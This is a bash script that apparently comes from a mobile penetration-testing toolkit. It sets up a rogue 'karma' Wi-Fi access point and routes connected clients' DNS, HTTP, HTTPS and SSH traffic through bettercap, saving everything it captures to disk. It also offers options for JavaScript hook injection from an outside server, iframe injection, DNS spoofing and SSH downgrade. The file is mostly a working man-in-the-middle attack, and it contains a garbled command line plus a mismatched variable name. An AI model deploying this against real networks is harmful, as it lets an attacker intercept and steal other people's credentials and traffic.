#!/bin/bash
upstream=wlan0
phy=wlan1
conf=/sdcard/nh_files/configs/hostapd-karma.conf
hostapd=/usr/lib/mana-toolkit/hostapd
# Change gateway below if not DNS
GATEWAY=$(/system/bin/getprop net.dns1)

# SELECT EITHER HTTPS OR DNS PROXY
HTTPS_PROXY=1   # Enable 1
DNS_SPOOF=0     # Enable 1

# BETTERCAP MODULES
SSH_DOWNGRADE=0 # Enable 1
INJECTJS_URL=0	# Enable 1
INJECTJS_FILE=0 # Enable 1
INJECT_HTML_URL=0   # Enable 1
RUBY_MODULE=0	# Run ruby module - Enable 1

# BETTERCAP HTTPD SRVR
HTTP_SRV_MODULE=0	#  Enable 1
HTTP_PATH="/var/www/bettercap"  # HTTPD Files

# BETTERCAP MODULE FILE LOCATIONS (change for ones you enable)
JS_URL="http://192.168.1.121:3000/hook.js"
JS_FILE="/root/bad.js"
HTML_FILE="http://192.168.1.121:9090/safetycheck"
RUBY_FILE="rickroll.rb"
DOWNGRADE_FILE="/root/bettercap-proxy-modules/tcp/sshdowngrade.rb"
TCP_PROXY_UPSTREAM="ssh.changeme.com"  # E.g. ssh downgrade

# SET MODULE EMPTY
MODULE=""
SSH_MOD=""
HTTPD_MODULE=""
HTTPS=""

if [[ $INJECTJS_URL -eq 1 ]]; then
	MODULE="--proxy-module injectjs --js-url ${JS_URL}"
fi

if [[ $INJECTJS_FILE -eq 1 ]]; then
	MODULE="--proxy-module injectjs --js-file ${JS_FILE}"
fi

if [[ $INJECT_HTML_URL -eq 1 ]]; then
	MODULE="--proxy-module injecthtml --html-iframe-url ${HTML_FILE}"
fi

if [[ $RUBY_MODULE -eq 1 ]]; then
	MODULE="--proxy-module=${RUBY_FILE}"
fi

if [[ $HTTP_SRV_MODULE -eq 1 ]]; then
        HTTPD_MODULE="--httpd --httpd-path ${HTTP_PATH}"
fi

if [[ $HTTPS_PROXY -eq 1 ]]; then
        HTTPS="--proxy-https"
elif [[ $DNS_PROXY -eq 1 ]]; then
	HTTPS="--dns /sdcard/nh_files/configs/dnsspoof.conf"
elif [[ $HTTPS_PROXY -eq 1 && $DNS_SPOOF -eq 1 ]]; then
	echo "Only select HTTPS proxy or DNS SPOOF, not both"
	exit
fi

if [[ $SSH_DOWNGRADE -eq 1 ]]; then
        SSH_MOD="--tcp-proxy --tcp-proxy-module ${DOWNGRADE_FILE} --tcp-proxy-upstream address ${TCP_PROXY_UPSTREAM}"
fi


echo "MODULE: ${MODULE}"
echo "HTTPS: ${HTTPS}"
echo "SSH_MOD: ${SSH_MOD}"

# Enable ip forward
echo '1' > /proc/sys/net/ipv4/ip_forward
rfkill unblock wlan
echo -- $phy: flushing interface --
ip addr flush dev $phecho -- $phy: setting ip --
ip addr add 10.0.0.1/24 dev $phy
echo -- $phy: starting the interface --
ip link set $phy up
echo -- $phy: setting route --
ip route add default via 10.0.0.1 dev $phy

# Starting AP and DHCP
sed -i "s/^interface=.*$/interface=$phy/" $conf
$hostapd $conf &
sleep 5
touch /var/lib/dhcp/dhcpd.leases
dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo
#dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy
sleep 5

# Add fking rule to table 1006
for table in $(ip rule list | awk -F"lookup" '{print $2}');
do
DEF=`ip route show table $table|grep default|grep $upstream`
if ! [ -z "$DEF" ]; then
   break
fi
done
ip route add 10.0.0.0/24 dev $phy scope link table $table

# RM quota from chains to avoid errors in iptable-save
# http://lists.netfilter.org/pipermail/netfilter-buglog/2013-October/002995.html
iptables -F bw_INPUT
iptables -F bw_OUTPUT
# Save
# iptables-save > /tmp/rules.txt
# Flush
iptables -F
iptables -F -t nat
# Masquerade
iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
iptables -A FORWARD -i $phy -o $upstream -j ACCEPT

if [[ $HTTPS == "--dns /sdcard/nh_files/configs/dnsspoof.conf" ]]; then
	echo "Enabling DNS Spoofing in iptables: 53 > 10.0.0.1:5300"
	iptables -t nat -A PREROUTING -i $phy -p udp --destination-port 53 -j DNAT --to-destination 10.0.0.1:5300
fi

if [[ $HTTPS = "--proxy-https" ]]; then
	echo "Enabling HTTPS proxy in iptables: 443 > 10.0.0.1:8083"
	iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 443 -j DNAT --to-destination 10.0.0.1:8083
fi
if [[ ! -z $SSH_MOD ]]; then
        echo "Enabling SSH Downgrade in iptables: 22 > 10.0.0.1:2222"
        iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 22 -j DNAT --to-destination 10.0.0.1:2222
fi

echo " Enabling HTTPS proxy in iptables: 80 > 10.0.0.1:8080"
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j DNAT --to-destination 10.0.0.1:8080

# Create save folder for bettercap, get gateway IP and current time
mkdir -p /captures/bettercap /var/www/bettercap
TIME=$(date +"%m-%d-%y-%H%M%S")

# Start bettercap proxy
echo "Starting bettercap..."
echo "Saving output files to /captures/bettercap/sniffed-$TIME"
bettercap --no-discovery --no-spoofing \
	  --proxy $HTTPS \
	  -G $GATEWAY -I $phy -L \
	  --sniffer-output=/captures/bettercap/sniffed-$TIME.pcap \
	  -O "/captures/bettercap/sniffed-${TIME}" -P '*' -X \
	  $MODULE $HTTPD_MODULE $SSH_MOD

echo "Hit enter to kill me"
read
pkill dhcpd
pkill hostapd
pkill bettercap
## Restore
#iptables-restore < /tmp/rules.txt
#rm /tmp/rules.txt
## Remove iface and routes
ip addr flush dev $phy
ip link set $phy down
